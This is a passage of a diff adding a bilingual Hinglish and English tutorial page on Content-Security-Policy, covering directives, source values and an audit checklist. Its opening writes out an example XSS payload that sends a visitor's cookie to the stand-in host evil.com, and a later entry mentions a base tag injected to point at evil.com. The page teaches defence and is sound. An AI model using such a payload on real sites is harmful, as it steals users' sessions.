+  <div class="controls-wrapper">
+    <div class="lang-switch-wrapper">
+      <span id="lbl-hi" class="lang-active">Hindi</span>
+      <label class="switch">
+        <input type="checkbox" id="langToggle" onchange="toggleLanguage()">
+        <span class="slider"></span>
+      </label>
+      <span id="lbl-en" class="lang-inactive">English</span>
+    </div>
+    <button class="theme-toggle" id="themeBtn" onclick="toggleTheme()">☀️ Light Mode</button>
+    <div class="progress-dots" role="group" aria-label="Section jump">
+      <button class="progress-dot" data-anchor="hero" title="Intro"></button>
+      <button class="progress-dot" data-anchor="basics" title="Basics"></button>
+      <button class="progress-dot" data-anchor="syntax" title="Syntax"></button>
+      <button class="progress-dot" data-anchor="directives" title="Directives"></button>
+      <button class="progress-dot" data-anchor="values" title="Values"></button>
+      <button class="progress-dot" data-anchor="simulator" title="Simulator"></button>
+      <button class="progress-dot" data-anchor="misconfig" title="Misconfigurations"></button>
+      <button class="progress-dot" data-anchor="checklist" title="Checklist"></button>
+      <button class="progress-dot" data-anchor="summary" title="Summary"></button>
+    </div>
+  </div>
+</div>
+
+<main>
+
+  <!-- ============ HERO / COLD OPEN ============ -->
+  <section class="hero reveal" id="hero">
+    <div class="hero-badge"><span class="dot"></span><span class="lang-hi">Web Security Notes — Simple Hinglish</span><span class="lang-en">Web Security Notes — English</span></div>
+    <h1 class="hero-title">
+      <span class="lang-hi">Content-Security-Policy <span class="highlight-safe">(CSP)</span> ko basics se samjho</span>
+      <span class="lang-en">Understand Content-Security-Policy <span class="highlight-safe">(CSP)</span> from the basics</span>
+    </h1>
+    <p class="hero-sub">
+      <span class="lang-hi">Ek problem se shuru karte hain — kyunki CSP koi random feature nahi hai, yeh ek specific problem solve karne ke liye banaya gaya tha.</span>
+      <span class="lang-en">Let's start with a problem — because CSP isn't a random feature, it was designed to solve a very specific problem.</span>
+    </p>
+
+    <div class="story">
+      <span class="lbl"><span class="lang-hi">⚠ Problem</span><span class="lang-en">⚠ Problem</span></span>
+      <p><span class="lang-hi">Socho ek website hai — login form hai, comment section hai, search bar hai. Sab kuch normal chal raha hai.</span><span class="lang-en">Imagine a website — it has a login form, a comment section, a search bar. Everything works normally.</span></p>
+      <p><span class="lang-hi">Ek din, ek attacker comment box mein yeh type karta hai:</span><span class="lang-en">One day, an attacker types this into the comment box:</span></p>
+      <p><code class="inline-code">&lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code></p>
+      <p><span class="lang-hi">Website is comment ko bina check kiye directly page pe show kar deta hai. Ab jo bhi is comment ko dekhta hai, uska browser yeh script chala deta hai — aur uska cookie chupke se attacker ke server pe chala jaata hai. Isko <strong>XSS (Cross-Site Scripting)</strong> kehte hain — attacker victim ke browser mein apna script "inject" kar deta hai.</span><span class="lang-en">The website displays this comment directly on the page without validating it. Now, whoever views this comment, their browser executes this script — and their cookie is silently sent to the attacker's server. This is called <strong>XSS (Cross-Site Scripting)</strong> — the attacker "injects" their script into the victim's browser.</span></p>
+      <p><span class="lang-hi">Developer input validation karta hai, kuch characters filter karta hai — phir bhi naye bypass milte rehte hain, kyunki HTML aur JavaScript itne flexible hain ki har tarah ka encoding/obfuscation try kiya ja sakta hai.</span><span class="lang-en">The developer adds input validation and filters some characters — yet new bypasses keep emerging, because HTML and JavaScript are so flexible that any kind of encoding/obfuscation can be tried.</span></p>
+      <p><span class="lang-hi"><strong>Asli problem yeh hai:</strong> BROWSER ko yeh pata hi nahi hota ki konsa script "legitimate developer ka" hai aur konsa "attacker ne inject kiya hai" — dono ek jaise dikhte hain, browser dono ko equally trust karke chala deta hai.</span><span class="lang-en"><strong>The real problem is:</strong> The BROWSER has no idea which script belongs to the "legitimate developer" and which was "injected by an attacker" — both look exactly the same, and the browser trusts and executes both equally.</span></p>
+    </div>
+
+    <div class="story story-solution">
+      <span class="lbl"><span class="lang-hi">✓ Solution</span><span class="lang-en">✓ Solution</span></span>
+      <p><span class="lang-hi">Isi problem ko solve karne ke liye <strong>CSP (Content Security Policy)</strong> banaya gaya — ek naya idea: "Filter karne ki koshish chhodo, seedha SERVER browser ko bata de ki sirf KAUN SE sources se script/style/image allowed hain — baaki sab, chahe kitna bhi clever payload ho, browser khud hi block kar dega."</span><span class="lang-en">To solve this exact problem, <strong>CSP (Content Security Policy)</strong> was invented — a new approach: "Stop trying to filter everything. Instead, have the SERVER directly tell the browser EXACTLY WHICH sources are allowed for scripts/styles/images — everything else, no matter how clever the payload, the browser will block automatically."</span></p>
+      <p><span class="lang-hi">Matlab: chahe attacker apna script kitni bhi cleverly inject kar de, agar uska SOURCE (kahan se aaya) CSP ki allowed list mein nahi hai — browser use chalayega hi nahi. Filtering ki jagah ab <strong>ALLOWLISTING</strong> ho gayi.</span><span class="lang-en">Meaning: no matter how cleverly an attacker injects their script, if its SOURCE is not in the CSP allowlist — the browser simply won't execute it. Filtering has been replaced by <strong>ALLOWLISTING</strong>.</span></p>
+    </div>
+  </section>
+
+  <!-- ============ BASICS ============ -->
+  <section class="section reveal" id="basics">
+    <span class="eyebrow"><span class="lang-hi">Step 01</span><span class="lang-en">Step 01</span></span>
+    <h2 class="section-title"><span class="lang-hi">CSP hai kya, bilkul basic se</span><span class="lang-en">What is CSP, from the absolute basics</span></h2>
+    <div class="intro-block" style="margin-top: 0; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);">
+      <p style="margin-bottom: 14px; font-size: 15px; line-height: 1.7; text-align: justify; color: var(--text);">
+        <span class="lang-hi"><strong>Content-Security-Policy (CSP)</strong> ek HTTP RESPONSE header hai jo server browser ko bhejta hai. Yeh header browser ko explicitly batata hai ki page ke liye scripts, styles, images, fonts, frames aur baaki resources <strong>kahan se load ya execute karna allowed hai</strong>.</span>
+        <span class="lang-en"><strong>Content-Security-Policy (CSP)</strong> is an HTTP RESPONSE header sent by the server to the browser. This header explicitly tells the browser <strong>from where it is allowed to load or execute</strong> scripts, styles, images, fonts, frames, and other resources for the page.</span>
+      </p>
+      <p style="margin-bottom: 0; font-size: 15px; line-height: 1.7; text-align: justify; color: var(--text);">
+        <span class="lang-hi">Jab bhi browser koi naya resource load karne ki koshish karta hai, wo pehle is CSP policy ko check karta hai. Agar resource ka source CSP ki allowed list (whitelist) mein maujood hai, toh browser use load kar lega. Agar wo source allowed list mein nahi hai, toh browser usse <strong>block</strong> kar dega aur console mein violation error show karega. Is policy ko strictly browser enforce karta hai, jisse unauthorized ya malicious scripts (jaise XSS) execute nahi ho paati.</span>
+        <span class="lang-en">Whenever the browser attempts to load a new resource, it first checks this CSP policy. If the resource's source is present in the CSP allowlist (whitelist), the browser will load it. If the source is not in the allowlist, the browser will <strong>block</strong> it and show a violation error in the console. This policy is strictly enforced by the browser, preventing unauthorized or malicious scripts (like XSS) from executing.</span>
+      </p>
+    </div>
+  </section>
+
+  <!-- ============ SYNTAX ============ -->
+  <section class="section reveal" id="syntax">
+    <span class="eyebrow"><span class="lang-hi">Step 02</span><span class="lang-en">Step 02</span></span>
+    <h2 class="section-title"><span class="lang-hi">CSP likhte kaise hain — Syntax</span><span class="lang-en">How to write CSP — Syntax</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">CSP ko HTTP response header ki tarah bhejte hain. Ek example dekhte hain, fir usse todke samajhte hain.</span>
+      <span class="lang-en">CSP is sent as an HTTP response header. Let's look at an example, then break it down to understand it.</span>
+    </p>
+
+    <span class="code-label"><span class="lang-hi">Example Header</span><span class="lang-en">Example Header</span></span>
+    <pre class="code-block"><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; object-src 'none';</code></pre>
+
+    <div class="syntax-annot">
+      <div class="annot-row"><code>Content-Security-Policy:</code><span class="d"><span class="lang-hi">Header ka naam — server response mein yeh key bhejta hai.</span><span class="lang-en">Header name — the server sends this key in the response.</span></span></div>
+      <div class="annot-row"><code>default-src, script-src...</code><span class="d"><span class="lang-hi">Yeh <strong style="color:var(--text)">directives</strong> hain — har directive ek TYPE ke resource ko control karta hai (kaunsa resource kahan se load ho sakta hai).</span><span class="lang-en">These are <strong style="color:var(--text)">directives</strong> — each directive controls a TYPE of resource (where that resource can be loaded from).</span></span></div>
+      <div class="annot-row"><code>'self' https://cdn...</code><span class="d"><span class="lang-hi">Har directive ke baad SPACE-separated list hoti hai allowed <strong style="color:var(--text)">sources</strong> ki.</span><span class="lang-en">After each directive, there is a SPACE-separated list of allowed <strong style="color:var(--text)">sources</strong>.</span></span></div>
+      <div class="annot-row"><code>;</code><span class="d"><span class="lang-hi">Semicolon se ek directive khatam hoke agla directive shuru hota hai. Multiple directives ek hi header mein combine ho jaate hain.</span><span class="lang-en">A semicolon ends one directive and starts the next. Multiple directives are combined in a single header this way.</span></span></div>
+    </div>
+
+    <div class="meta-note">
+      <span class="icon">📄</span>
+      <div>
+        <span class="code-label" style="margin-bottom:6px;"><span class="lang-hi">Alternative — Meta Tag</span><span class="lang-en">Alternative — Meta Tag</span></span>
+        <p style="font-size:14px;color:var(--text-muted);margin-bottom:10px;">
+          <span class="lang-hi">Agar server headers control nahi kar sakte (jaise shared hosting), to HTML ke andar meta tag se bhi CSP laga sakte ho:</span>
+          <span class="lang-en">If you can't control server headers (like in shared hosting), you can also apply CSP using a meta tag inside the HTML:</span>
+        </p>
+        <pre class="code-block" style="margin:0;"><code>&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'"&gt;</code></pre>
+      </div>
+    </div>
+
+    <div class="warn-box">
+      <strong><span class="lang-hi">⚠ Limitation:</span><span class="lang-en">⚠ Limitation:</span></strong> 
+      <span class="lang-hi"><code style="color:var(--danger)">frame-ancestors</code>, <code style="color:var(--danger)">report-uri</code>/<code style="color:var(--danger)">report-to</code>, aur <code style="color:var(--danger)">sandbox</code> directives sirf REAL HTTP header se kaam karte hain — meta tag se yeh kaam nahi karte, browser inhe ignore kar dega.</span>
+      <span class="lang-en"><code style="color:var(--danger)">frame-ancestors</code>, <code style="color:var(--danger)">report-uri</code>/<code style="color:var(--danger)">report-to</code>, and <code style="color:var(--danger)">sandbox</code> directives only work via REAL HTTP headers — they do not work via meta tags; the browser will ignore them.</span>
+    </div>
+
+    <span class="code-label" style="margin-top:24px;"><span class="lang-hi">Testing Mode — Report Only</span><span class="lang-en">Testing Mode — Report Only</span></span>
+    <pre class="code-block"><code>Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report</code></pre>
+    <p style="font-size:14.5px;color:var(--text-muted);">
+      <span class="lang-hi">Yeh header naam mein <strong style="color:var(--text)">"-Report-Only"</strong> hai — matlab yeh kuch bhi BLOCK nahi karta, sirf VIOLATIONS ko specified URL pe report karta hai. Production mein CSP enforce karne se pehle isse TEST karna best practice hai, taaki pata chale policy se koi legitimate cheez to nahi toot rahi.</span>
+      <span class="lang-en">This header has <strong style="color:var(--text)">"-Report-Only"</strong> in its name — meaning it doesn't BLOCK anything, it only reports VIOLATIONS to the specified URL. It's best practice to TEST with this before enforcing CSP in production, to ensure the policy doesn't break legitimate features.</span>
+    </p>
+  </section>
+
+  <!-- ============ DIRECTIVES ============ -->
+  <section class="section reveal" id="directives">
+    <span class="eyebrow"><span class="lang-hi">Step 03</span><span class="lang-en">Step 03</span></span>
+    <h2 class="section-title"><span class="lang-hi">CSP Directives — "Attributes" jo aap set karte ho</span><span class="lang-en">CSP Directives — The "Attributes" you set</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">Yeh hi CSP ke asli "attributes" hain jo aapne poochhe the. Har directive ek specific TYPE ke resource ko control karta hai. Inhe 4 categories mein group kiya gaya hai — yeh official grouping hai, random nahi.</span>
+      <span class="lang-en">These are the actual "attributes" of CSP you asked about. Each directive controls a specific TYPE of resource. They are grouped into 4 categories — this is the official grouping, not random.</span>
+    </p>
+    <div id="directivesContainer"></div>
+  </section>
+
+  <!-- ============ SOURCE VALUES ============ -->
+  <section class="section reveal" id="values">
+    <span class="eyebrow"><span class="lang-hi">Step 04</span><span class="lang-en">Step 04</span></span>
+    <h2 class="section-title"><span class="lang-hi">Source Values — Directive ke andar kya likhte hain</span><span class="lang-en">Source Values — What to write inside a directive</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">Har directive (jaise script-src) ke baad ek VALUE likhte hain — yeh batata hai "kis se" allow karna hai. Yeh values bhi CSP ke attributes hi hain, bas yeh directive ke <strong>andar</strong> jaate hain.</span>
+      <span class="lang-en">After every directive (like script-src), we write a VALUE — this dictates "from where" to allow. These values are also CSP attributes, they just go <strong>inside</strong> the directive.</span>
+    </p>
+    <div id="valuesContainer"></div>
+  </section>
+
+  <!-- ============ SIMULATOR ============ -->
+  <section class="section reveal sim-section" id="simulator">
+    <span class="eyebrow"><span class="lang-hi">Step 05 — Live Demo</span><span class="lang-en">Step 05 — Live Demo</span></span>
+    <h2 class="section-title"><span class="lang-hi">Simulator: CSP config change karke dekho</span><span class="lang-en">Simulator: Change the CSP config and see</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">Neeche 3 alag attack payloads ek hi "vulnerable" page pe try honge. Ek CSP config choose karo aur test karo — dekho kaunsa payload block hota hai, kaunsa execute ho jaata hai, aur <strong>kyun</strong>.</span>
+      <span class="lang-en">Below, 3 different attack payloads will be tried on the same "vulnerable" page. Choose a CSP config and test it — see which payload gets blocked, which executes, and <strong>why</strong>.</span>
+    </p>
+
+    <div class="sim-wrap">
+      <div class="sim-controls">
+        <p class="sim-config-label"><span class="lang-hi">CSP config choose karo:</span><span class="lang-en">Choose a CSP config:</span></p>
+        <div class="config-grid" id="configGrid"></div>
+        <button class="test-btn" id="testBtn">
+          <span class="lang-hi">▶ Is Config Ko Test Karo</span>
+          <span class="lang-en">▶ Test This Config</span>
+        </button>
+      </div>
+      <div class="browser-mock">
+        <div class="browser-bar">
+          <div class="browser-dots">
+            <div class="browser-dot"></div><div class="browser-dot"></div><div class="browser-dot"></div>
+          </div>
+          <div class="url-bar">https://example.com/comments</div>
+        </div>
+        <div class="console-panel" id="consolePanel">
+          <div class="console-placeholder">
+            <span class="lang-hi">Ek config select karke "Test Karo" dabao — console output yahan dikhega.</span>
+            <span class="lang-en">Select a config and click "Test" — console output will appear here.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ MISCONFIGURATIONS ============ -->
+  <section class="section reveal" id="misconfig">
+    <span class="eyebrow"><span class="lang-hi">Step 06 — Tester's Eye</span><span class="lang-en">Step 06 — Tester's Eye</span></span>
+    <h2 class="section-title"><span class="lang-hi">Common Misconfigurations (Bypass Patterns)</span><span class="lang-en">Common Misconfigurations (Bypass Patterns)</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">Web security tester ke perspective se — yeh woh galtiyan hain jo CSP ko practically bekaar bana deti hain, chahe header present ho.</span>
+      <span class="lang-en">From a web security tester's perspective — these are the mistakes that render CSP practically useless, even if the header is present.</span>
+    </p>
+    <div class="misconfig-list" id="misconfigList"></div>
+  </section>
+
+  <!-- ============ CHECKLIST ============ -->
+  <section class="section reveal" id="checklist">
+    <span class="eyebrow"><span class="lang-hi">Step 07 — Tester Checklist</span><span class="lang-en">Step 07 — Tester Checklist</span></span>
+    <h2 class="section-title"><span class="lang-hi">CSP Audit karte waqt kya check karein</span><span class="lang-en">What to check during a CSP Audit</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">Jab bhi ek site pe CSP test kar rahe ho, yeh checklist follow karo. Tap karke mark kar sakte ho (progress track karne ke liye).</span>
+      <span class="lang-en">Whenever testing CSP on a site, follow this checklist. Tap to mark them off (to track your progress).</span>
+    </p>
+
+    <div class="checklist-progress">
+      <span class="progress-text" id="progressText">0 / 14 checked</span>
+      <div class="progress-bar-track"><div class="progress-bar-fill" id="progressFill"></div></div>
+    </div>
+    <div class="checklist" id="checklistContainer"></div>
+
+    <div class="tools-note">
+      <strong><span class="lang-hi">Tools jo use hote hain:</span><span class="lang-en">Tools used:</span></strong> 
+      <span class="lang-hi">Browser DevTools Console (violations live dikhte hain) · Google CSP Evaluator — csp-evaluator.withgoogle.com (policy paste karke weaknesses check karo) · Burp Suite (response headers check + CSP-related extensions).</span>
+      <span class="lang-en">Browser DevTools Console (violations are visible live) · Google CSP Evaluator — csp-evaluator.withgoogle.com (paste policy to check weaknesses) · Burp Suite (check response headers + CSP-related extensions).</span>
+    </div>
+  </section>
+
+  <!-- ============ SUMMARY TABLE ============ -->
+  <section class="section reveal" id="summary">
+    <span class="eyebrow"><span class="lang-hi">Step 08 — Quick Revision</span><span class="lang-en">Step 08 — Quick Revision</span></span>
+    <h2 class="section-title"><span class="lang-hi">Sab Directives — Ek Table Mein</span><span class="lang-en">All Directives — In One Table</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">Revision ke liye compact summary.</span>
+      <span class="lang-en">A compact summary for revision.</span>
+    </p>
+    <div class="table-wrap">
+      <table class="summary-table">
+        <thead>
+          <tr>
+            <th>Directive</th>
+            <th>Category</th>
+            <th><span class="lang-hi">Kya Control Karta Hai</span><span class="lang-en">What it Controls</span></th>
+          </tr>
+        </thead>
+        <tbody id="summaryTableBody"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============ GLOSSARY ============ -->
+  <section class="section reveal" id="glossary">
+    <span class="eyebrow"><span class="lang-hi">Reference</span><span class="lang-en">Reference</span></span>
+    <h2 class="section-title"><span class="lang-hi">Glossary — Chhote Terms Yahan Clear Kar Lo</span><span class="lang-en">Glossary — Clear Up Small Terms Here</span></h2>
+    <p class="section-desc">
+      <span class="lang-hi">Agar upar kahin koi term samajh na aaya ho, yahan dobara dekh lo.</span>
+      <span class="lang-en">If you didn't understand any term above, review it here.</span>
+    </p>
+    <div class="glossary-grid" id="glossaryContainer"></div>
+  </section>
+
+</main>
+
+<footer class="modern-footer">
+  <div class="footer-badge">
+    <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+  </div>
+</footer>
+
+<script>
+// =====================================================================
+// EXPOSE TOGGLE FUNCTIONS TO GLOBAL SCOPE FOR INLINE ONCLICK/ONCHANGE
+// =====================================================================
+
+window.toggleTheme = function() {
+  var html = document.documentElement;
+  var themeBtn = document.getElementById('themeBtn');
+  if (html.getAttribute('data-theme') === 'dark') {
+    html.setAttribute('data-theme', 'light');
+    if (themeBtn) themeBtn.textContent = '🌙 Dark Mode';
+  } else {
+    html.setAttribute('data-theme', 'dark');
+    if (themeBtn) themeBtn.textContent = '☀️ Light Mode';
+  }
+};
+
+window.toggleLanguage = function() {
+  var html = document.documentElement;
+  var toggle = document.getElementById('langToggle');
+  var lblHi = document.getElementById('lbl-hi');
+  var lblEn = document.getElementById('lbl-en');
+  
+  if (toggle && toggle.checked) {
+    html.setAttribute('data-lang', 'en');
+    html.setAttribute('lang', 'en');
+    if(lblEn) { lblEn.classList.add('lang-active'); lblEn.classList.remove('lang-inactive'); }
+    if(lblHi) { lblHi.classList.add('lang-inactive'); lblHi.classList.remove('lang-active'); }
+  } else {
+    html.setAttribute('data-lang', 'hi');
+    html.setAttribute('lang', 'hi');
+    if(lblHi) { lblHi.classList.add('lang-active'); lblHi.classList.remove('lang-inactive'); }
+    if(lblEn) { lblEn.classList.add('lang-inactive'); lblEn.classList.remove('lang-active'); }
+  }
+};
+
+
+// =====================================================================
+// DATA (FULLY BILINGUAL)
+// =====================================================================
+
+var directiveGroups = [
+  {
+    group: "<span class='lang-hi'>Fetch Directives</span><span class='lang-en'>Fetch Directives</span>",
+    desc: "<span class='lang-hi'>Yeh directives batate hain ki har TYPE ke resource (script, style, image, etc.) kahan se load ho sakte hain.</span><span class='lang-en'>These directives specify where each TYPE of resource (script, style, image, etc.) can be loaded from.</span>",
+    items: [
+      { name:"default-src", tag:"Fallback", tagType:"tag-imp",
+        def:"<span class='lang-hi'>Sabse important FALLBACK directive. Agar kisi specific directive (jaise script-src) ko explicitly set nahi kiya gaya, browser uske liye default-src ki value use karta hai. Yeh sirf FETCH directives ke liye fallback hai — base-uri, form-action, frame-ancestors jaise directives ke liye koi fallback nahi hota, unhe alag se set karna padta hai.</span><span class='lang-en'>The most important FALLBACK directive. If a specific directive (like script-src) is not explicitly set, the browser uses the value of default-src. This is a fallback only for FETCH directives — directives like base-uri, form-action, and frame-ancestors have no fallback and must be set separately.</span>",
+        ex:"default-src 'self';" },
+      { name:"script-src", tag:"Most Important", tagType:"tag-danger",
+        def:"<span class='lang-hi'>JavaScript files, inline script tags, aur event handlers (jaise onclick) — in sabke allowed sources ko control karta hai. XSS defense ke liye sabse zyada important directive hai.</span><span class='lang-en'>Controls the allowed sources for JavaScript files, inline script tags, and event handlers (like onclick). This is the most crucial directive for XSS defense.</span>",
+        ex:"script-src 'self' https://cdn.jsdelivr.net;" },
+      { name:"style-src", tag:null,
+        def:"<span class='lang-hi'>CSS files aur inline styles ke allowed sources control karta hai.</span><span class='lang-en'>Controls the allowed sources for CSS files and inline styles.</span>",
+        ex:"style-src 'self' 'unsafe-inline';" },
+      { name:"img-src", tag:null,
+        def:"<span class='lang-hi'>Images (img tag, background-image CSS) kahan se load ho sakti hain, yeh control karta hai.</span><span class='lang-en'>Controls where images (img tag, background-image CSS) can be loaded from.</span>",
+        ex:"img-src 'self' data: https://images.example.com;" },
+      { name:"connect-src", tag:"Data Exfiltration Defense", tagType:"tag-imp",
+        def:"<span class='lang-hi'>JavaScript se fetch(), XMLHttpRequest, WebSocket jaise network calls kahan ja sakte hain, yeh restrict karta hai. Agar attacker XSS se data chura bhi le, connect-src use bahar bhejne se rok sakta hai.</span><span class='lang-en'>Restricts where network calls from JavaScript like fetch(), XMLHttpRequest, and WebSocket can go. Even if an attacker steals data via XSS, connect-src can prevent it from being sent out.</span>",
+        ex:"connect-src 'self' https://api.example.com;" },
+      { name:"font-src", tag:null,
+        def:"<span class='lang-hi'>Custom fonts (font-face CSS rule se) kahan se load ho sakte hain.</span><span class='lang-en'>Controls where custom fonts (via font-face CSS rule) can be loaded from.</span>",
+        ex:"font-src 'self' https://fonts.gstatic.com;" },
+      { name:"object-src", tag:"Usually 'none'", tagType:"tag-neutral",
+        def:"<span class='lang-hi'>Object, embed, aur applet tags (jo purane plugins jaise Flash load karte the) ke sources control karta hai. Aksar 'none' set kiya jata hai kyunki yeh legacy attack vectors hain.</span><span class='lang-en'>Controls sources for object, embed, and applet tags (which loaded legacy plugins like Flash). It is often set to 'none' as these are legacy attack vectors.</span>",
+        ex:"object-src 'none';" },
+      { name:"media-src", tag:null, 
+        def:"<span class='lang-hi'>Audio aur video tags ke allowed sources control karta hai.</span><span class='lang-en'>Controls the allowed sources for audio and video tags.</span>", 
+        ex:"media-src 'self';" },
+      { name:"frame-src", tag:null, 
+        def:"<span class='lang-hi'>Iframe ke andar kya load ho sakta hai, yeh control karta hai.</span><span class='lang-en'>Controls what can be loaded inside an iframe.</span>", 
+        ex:"frame-src 'self' https://youtube.com;" },
+      { name:"worker-src", tag:"Lighter Use", tagType:"tag-neutral", 
+        def:"<span class='lang-hi'>Web Worker, Shared Worker, aur Service Worker scripts ke sources control karta hai.</span><span class='lang-en'>Controls the sources for Web Worker, Shared Worker, and Service Worker scripts.</span>", 
+        ex:"worker-src 'self';" },
+      { name:"manifest-src", tag:"Lighter Use", tagType:"tag-neutral", 
+        def:"<span class='lang-hi'>Web app manifest file (manifest.json) kahan se load ho sakti hai.</span><span class='lang-en'>Controls where the web app manifest file (manifest.json) can be loaded from.</span>", 
+        ex:"manifest-src 'self';" }
+    ]
+  },
+  {
+    group: "<span class='lang-hi'>Document Directives</span><span class='lang-en'>Document Directives</span>",
+    desc: "<span class='lang-hi'>Yeh directives page ke document-level properties ko control karte hain.</span><span class='lang-en'>These directives control page-level document properties.</span>",
+    items: [
+      { name:"base-uri", tag:"Important Gap", tagType:"tag-danger",
+        def:"<span class='lang-hi'>Base tag mein kaunsa URL use ho sakta hai, yeh restrict karta hai. IMPORTANT: agar attacker base tag inject kar de (base href='https://evil.com/') aur base-uri restrict na ho, to page ke saare RELATIVE URLs (scripts, links) attacker ke domain se load hone lagenge!</span><span class='lang-en'>Restricts which URL can be used in the base tag. IMPORTANT: if an attacker injects a base tag (base href='https://evil.com/') and base-uri is not restricted, all RELATIVE URLs (scripts, links) on the page will start loading from the attacker's domain!</span>",
+        ex:"base-uri 'self';" },
+      { name:"sandbox", tag:"Rarely Used", tagType:"tag-neutral",
+        def:"<span class='lang-hi'>Iframe ke sandbox attribute jaisi restrictions apply karta hai (scripts, forms, popups disable) — top-level page pe rarely use hota hai.</span><span class='lang-en'>Applies restrictions similar to the iframe sandbox attribute (disables scripts, forms, popups) — rarely used on a top-level page.</span>",
+        ex:"sandbox allow-scripts allow-same-origin;" }
+    ]
+  },
+  {
+    group: "<span class='lang-hi'>Navigation Directives</span><span class='lang-en'>Navigation Directives</span>",
+    desc: "<span class='lang-hi'>Yeh directives control karte hain page kahan navigate ya embed ho sakta hai.</span><span class='lang-en'>These directives control where a page can navigate or be embedded.</span>",
+    items: [
+      { name:"form-action", tag:null,
+        def:"<span class='lang-hi'>HTML form submit hone ke baad kahan ja sakta hai (action target), yeh restrict karta hai. Isse attacker aapke form ka data apne server pe redirect nahi kar sakta.</span><span class='lang-en'>Restricts where an HTML form can submit data to (the action target). This prevents an attacker from redirecting your form data to their server.</span>",
+        ex:"form-action 'self';" },
+      { name:"frame-ancestors", tag:"Clickjacking Defense", tagType:"tag-imp",
+        def:"<span class='lang-hi'>Yeh control karta hai ki KAUN aapki site ko iframe mein embed kar sakta hai. Clickjacking defense ke liye use hota hai — X-Frame-Options ka modern replacement. IMPORTANT: sirf HTTP header se kaam karta hai, meta tag se nahi.</span><span class='lang-en'>Controls WHO can embed your site in an iframe. Used for Clickjacking defense — the modern replacement for X-Frame-Options. IMPORTANT: only works via HTTP header, not meta tags.</span>",
+        ex:"frame-ancestors 'self';" }
+    ]
+  },
+  {
+    group: "<span class='lang-hi'>Reporting & Other</span><span class='lang-en'>Reporting & Other</span>",
+    desc: "<span class='lang-hi'>Violations track karne ke liye aur kuch extra behaviours ke liye.</span><span class='lang-en'>For tracking violations and some extra behaviors.</span>",
+    items: [
+      { name:"report-uri", tag:"Deprecated", tagType:"tag-neutral",
+        def:"<span class='lang-hi'>(Purana, lekin abhi bhi kai jagah dikhta hai) Jab bhi CSP violate hoti hai, browser ek JSON report is URL pe POST karta hai — isse production mein violations track kar sakte ho.</span><span class='lang-en'>(Deprecated, but still seen) Whenever CSP is violated, the browser POSTs a JSON report to this URL — used to track violations in production.</span>",
+        ex:"report-uri /csp-violation-report;" },
+      { name:"report-to", tag:"Modern", tagType:"tag-safe",
+        def:"<span class='lang-hi'>report-uri ka modern replacement, browser ki Reporting API ke saath kaam karta hai (isko ek separate Report-To header ke saath configure karna padta hai).</span><span class='lang-en'>The modern replacement for report-uri, works with the browser's Reporting API (requires configuring a separate Report-To header).</span>",
+        ex:"report-to csp-endpoint;" },
+      { name:"upgrade-insecure-requests", tag:null,
+        def:"<span class='lang-hi'>Browser ko bolta hai: page ke saare HTTP requests ko automatically HTTPS mein upgrade kar do, fetch karne se pehle. Iske value mein koi source list nahi hoti, bas directive akela likha jata hai.</span><span class='lang-en'>Instructs the browser to automatically upgrade all HTTP requests on the page to HTTPS before fetching. It doesn't take a source list, the directive is just written alone.</span>",
+        ex:"upgrade-insecure-requests;" },
+      { name:"require-trusted-types-for", tag:"Advanced", tagType:"tag-neutral",
+        def:"<span class='lang-hi'>DOM-based XSS ko rokne ke liye Trusted Types API force karta hai — risky sinks jaise innerHTML ko safe banata hai. Yeh ek advanced topic hai, basics complete hone ke baad explore karna.</span><span class='lang-en'>Forces the Trusted Types API to prevent DOM-based XSS — makes risky sinks like innerHTML safe. This is an advanced topic to explore after mastering the basics.</span>",
+        ex:"require-trusted-types-for 'script';" }
+    ]
+  }
+];
+
+var valueGroups = [
+  {
+    group: "<span class='lang-hi'>Keywords</span><span class='lang-en'>Keywords</span>",
+    items: [
+      { name:"'self'", danger:false, 
+        def:"<span class='lang-hi'>Same origin (scheme + host + port jo page ka khud hai) se allowed. Agar page https://example.com pe hai, to 'self' ka matlab hai sirf https://example.com se — subdomain (jaise blog.example.com) ya http (different scheme) include nahi hota.</span><span class='lang-en'>Allowed from the same origin (scheme + host + port of the page itself). If the page is at https://example.com, 'self' means only https://example.com — subdomains (like blog.example.com) or http (different scheme) are not included.</span>", 
+        ex:"script-src 'self';" },
+      { name:"'none'", danger:false, 
+        def:"<span class='lang-hi'>Kuch bhi allowed nahi — is directive ke liye sab kuch block ho jaata hai.</span><span class='lang-en'>Nothing is allowed — everything is blocked for this directive.</span>", 
+        ex:"object-src 'none';" },
+      { name:"'unsafe-inline'", danger:true, 
+        def:"<span class='lang-hi'>Inline scripts (script tag directly HTML mein), inline event handlers (onclick=), aur inline styles allow karta hai. DANGEROUS hai kyunki yehi cheez XSS attacker exploit karta hai — ise use karne se CSP ka XSS-protection ka bohot bada fayda khatam ho jaata hai.</span><span class='lang-en'>Allows inline scripts (script tags directly in HTML), inline event handlers (onclick=), and inline styles. DANGEROUS because this is exactly what an XSS attacker exploits — using it defeats a major benefit of CSP's XSS protection.</span>", 
+        ex:"script-src 'self' 'unsafe-inline';" },
+      { name:"'unsafe-eval'", danger:true, 
+        def:"<span class='lang-hi'>eval(), Function() constructor, string wale setTimeout/setInterval — yeh sab allow karta hai. Dynamic code execution risky hota hai, isliye naam mein 'unsafe' hai.</span><span class='lang-en'>Allows eval(), Function() constructor, and string-based setTimeout/setInterval. Dynamic code execution is risky, hence 'unsafe' in the name.</span>", 
+        ex:"script-src 'self' 'unsafe-eval';" },
+      { name:"'unsafe-hashes'", danger:true, 
